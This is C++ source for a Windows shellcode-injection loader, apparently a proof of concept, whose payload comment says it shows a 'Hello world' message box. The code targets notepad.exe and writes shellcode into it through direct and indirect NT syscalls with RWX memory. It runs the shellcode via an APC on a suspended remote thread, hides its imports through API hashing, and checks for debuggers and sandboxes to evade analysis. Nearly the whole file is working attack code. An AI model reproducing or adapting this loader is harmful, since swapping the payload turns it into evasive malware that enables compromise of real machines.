#include "header.h"

    // process injection
    //// 1. find process                                                    ////
	//// 2. Open the target process                                         ////
	//// 3.  allocate memory on the remote process                          ////
	//// 5. write the shellcode in the remote process                       ////
	//// 6.  Create suspended thread                                        ////
	//// 7. queue the APC to execute the shellcode in the remote thread     ////


// for antidebug
BOOL AntiDebugAndSandboxCheck(PPEB ppeb) {

    // degugger detection
    if (ppeb->BeingDebugged != 0) {
        printf("[-] Debugger detected! lets do some math ...\n");
        //printf("res : %llu\n", fibonacci(43));
        return 1;
    }

    // also a debugger detection
    if (IsDebuggerPresent()) {
        printf("[-] Debugger detected via IsDebuggerPresent\n");
        return FALSE;
    }

    // same
    BOOL debugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger);
    if (debugger) {
        printf("[-] Debugger detected by CheckRemoteDebuggerPresent\n");
        return FALSE;
    }

    // Check system uptime
    if (GetTickCount64() < 5000) {
        printf("[-] System uptime too low, likely sandbox\n");
        return FALSE;
    }

    // Check for mouse movement
    POINT p1 = { 0 }, p2 = { 0 };
    GetCursorPos(&p1);
    Sleep(5000);
    GetCursorPos(&p2);

    if (p1.x == p2.x && p1.y == p2.y) {
        printf("[-] Mouse hasn\'t moved => sandbox ?\n");
        return FALSE;
    }

    return TRUE;
}

unsigned long long fibonacci(unsigned int n) {
    if (n <= 1) return n;
    return fibonacci(n - 1) + fibonacci(n - 2);
}

// 
DWORD64 hashA(PCHAR chaine) {
    DWORD64 constante = 0xA28;
    int c = 0;

    while (c = *chaine++)
        constante = (constante << 5) + constante + c;

    return constante;
}
// compile time hash with constexpr
constexpr DWORD64 hashB(const char* chaine) {
    DWORD64 constante = 0xA28;
    int c = 0;

    while (c = *chaine++)
        constante = (constante << 5) + constante + c;

    return constante;
}

LPWSTR get_dll_name(PLDR_DATA_TABLE_ENTRY liste_flink) {

    PWCHAR ddl_name = liste_flink->FullDllName.Buffer;
    PWSTR dll = wcsrchr(ddl_name, '\\') + 1;
    return dll;
}

PVOID get_func(DWORD64 func_hashed) {

    // get the PEB
    PPEB ppeb = (PPEB)__readgsqword(0x60);

    // get the list which contains our loaded modules in the memory
    PLDR_DATA_TABLE_ENTRY liste_flink = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ppeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // get the DLL name
    LPWSTR dll_name = get_dll_name(liste_flink);

    // base address of the DLL load in memory
    PDWORD base_addr = (PDWORD)liste_flink->DllBase;

    // Header DOS of the image of the DLL
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS64 pe_header = (PIMAGE_NT_HEADERS64)((DWORD64)base_addr + dos_header->e_lfanew);

    // Adresse virtuelle du répertoire d'exportation
    ULONG offset_virtual_addresse = pe_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD64)offset_virtual_addresse + (DWORD64)base_addr);

    PDWORD adr_name = (PDWORD)((DWORD64)export_directory->AddressOfNames + (DWORD64)base_addr);
    PDWORD adr_func = (PDWORD)((DWORD64)export_directory->AddressOfFunctions + (DWORD64)base_addr);
    PWORD adr_ordinal = (PWORD)((DWORD64)export_directory->AddressOfNameOrdinals + (DWORD64)base_addr);

    // run on our number of function
    for (DWORD i = 0; i < export_directory->NumberOfFunctions; i++) {

        //PCHAR name = (PCHAR)(DWORD64)(adr_name + i * 8);

        DWORD_PTR adr_name_ = (DWORD64)adr_name[i] + (DWORD64)base_addr;
        //printf("Get :: %s\n", (char*)adr_name_);

        // compare the hash calculated of our function and the hash of the function of the dll
        if (func_hashed == hashA((char*)adr_name_)) {
            // be could use the name
            return (PVOID)((DWORD64)base_addr + adr_func[adr_ordinal[i]]);
        }
    }
    return 0;
}


// get PID of a process by its name
DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (!_wcsicmp(processEntry.szExeFile, processName.c_str())) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0; // Not found
}

DWORD FindThreadId(DWORD pid) {
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == pid) {
                CloseHandle(snapshot);
                return threadEntry.th32ThreadID;
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

// from here https://github.com/0xkylm/shitty-loader/blob/main/Shitty-loader/Shitty-loader.cpp#L42
BYTE* FindSyscallAddr(DWORD64 hash) {

    PVOID func_my_NtOpenProcess = (PVOID)get_func(hash);
    syscallAddress_NtOpenProcess = (DWORD64)(PVOID)func_my_NtOpenProcess;


    BYTE* func_base = (BYTE*)(func_my_NtOpenProcess);
    BYTE* temp_base = 0x00;
    //0x0F + 0x05 = syscall
    // 0xc3 = ret
    while (*func_base != 0xc3) {
        temp_base = func_base;
        if (*temp_base == 0x0f) {
            temp_base++;
            if (*temp_base == 0x05) {
                temp_base++;
                if (*temp_base == 0xc3) {
                    temp_base = func_base;
                    break;
                }
            }
        }
        else {
            func_base++;
            temp_base = 0x00;
        }
    }   
    return func_base;
}

int main() {

    // get the PEB
    PPEB ppeb = (PPEB)__readgsqword(0x60);
    printf("[+] PEB is : 0x % p\n", ppeb);

    if (!AntiDebugAndSandboxCheck(ppeb)) return 1;

	// payload (hello world) in opcode
    char shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    SIZE_T size_allocated = sizeof(shellcode);

    ////  1. find our process ////
    // lets use notepad for the poc
    HANDLE hProcess = NULL;
    DWORD pid = FindProcessId(L"notepad.exe");
	printf("[+] PID of notepad.exe is : %d\n", pid);
    if (pid == 0) {
        printf("[-] Process not found!\n");
        return 1;
	}

    // the struct client_id is used to identify a proces with the handle of our PID
	//// 2. Open the target process with NtOpenProcess ////
    CLIENT_ID client_id;
    client_id.UniqueProcess = (HANDLE)pid;
    client_id.UniqueThread = 0;

    OBJECT_ATTRIBUTES objattr;
    // macro that initialize the objectAttributes for usd
    InitializeObjectAttributes(&objattr, NULL, 0, NULL, NULL);

    DWORD64 hash_NtOpenProcess = hashB((PCHAR)"NtOpenProcess");
    syscallAddress_NtOpenProcess = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtOpenProcess);

    NTSTATUS status_NtOpenProcess = my_asm_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objattr, &client_id);
    if (status_NtOpenProcess != 0) {
        printf("\n[+] open process failed. Error code: 0x%08X\n", status_NtOpenProcess);
        return 1;
    }
    else {
        printf("\n[+] process open successfuly! Handle : 0x%p\n", hProcess);
    }

    //// 3. -> allocate memory on the remote process with NtAllocateVirtualMemory ////
    LPVOID remoteMemory = NULL;

    DWORD64 hash_NtAllocateVirtualMemory = hashB((PCHAR)"NtAllocateVirtualMemory");
    syscallAddress_AllocateVirtualMemory = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtAllocateVirtualMemory);

    NTSTATUS status_NtAllocateVirtualMemory = my_asm_NtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &size_allocated, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status_NtAllocateVirtualMemory != 0) {
        printf("[+] Allocation in the remote process failed. Error code: 0x%08X\n", status_NtAllocateVirtualMemory);
        return 1;
    }
    else {
        printf("[+] Allocated memory at: %p\n", remoteMemory);
    }

    //// 4. -> write the shellcode in the remote process with NtWriteVirtualMemory (memcpy can only write in our own process) ////

    DWORD64 hash_NtWriteVirtualMemory = hashA((PCHAR)"NtWriteVirtualMemory");
    syscallAddress_NtWriteVirtualMemory = (DWORD64)(PBYTE)FindSyscallAddr(hash_NtWriteVirtualMemory);

    NTSTATUS status_NtWriteVirtualMemory = my_asm_NtWriteVirtualMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), NULL);

    if (status_NtWriteVirtualMemory != 0) {
        printf("[+] Write in remote process failed. Error code: 0x%08X\n", status_NtWriteVirtualMemory);
        return 1;
    }

    printf("[+] shelcode injected !\n");

    //// 5. Create suspended thread ////
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert"), NULL, CREATE_SUSPENDED, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread\n");
        return 1;
    }
    printf("[+] Suspended thread created\n");

    // Queue APC
    DWORD64 hash_QueueAPC = hashB("NtQueueApcThread");
    syscallAddress_NtQueueApcThread = (DWORD64)FindSyscallAddr(hash_QueueAPC);

    if (my_asm_NtQueueApcThread(hThread, remoteMemory, NULL, NULL, NULL) != 0) {
        printf("[-] Failed to queue APC\n");
        return 1;
    }
    printf("[+] APC queued to thread\n");

    // Resume thread
    ResumeThread(hThread);
    printf("[+] Thread resumed\n");

    //// clean up that shit ////
    CloseHandle(hThread);
    CloseHandle(hProcess);
    ZeroMemory(shellcode, size_allocated);
    return 0;
}